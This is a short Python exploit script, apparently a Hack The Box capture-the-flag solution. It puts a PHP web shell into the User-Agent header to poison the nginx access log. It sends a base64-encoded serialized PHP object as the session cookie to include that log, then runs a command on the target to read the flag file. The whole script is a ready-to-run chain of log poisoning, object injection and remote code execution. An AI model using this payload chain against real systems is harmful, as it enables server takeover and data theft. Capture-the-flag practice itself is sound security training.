import requests
import re

header = {"User-Agent": "<?php echo system($_REQUEST['cmd'])?>"}
cookie = {'PHPSESSID': 'Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo='}
targetIp = 'http://165.227.224.109:30017' # change this

command = 'cat /flag_*'
url =  f"{targetIp}/?cmd={command}"
response = requests.get(url, headers=header, cookies=cookie)
flagMatch = re.search('HTB\{.*\}', response.text)
print(f"Flag: {flagMatch.group()}")
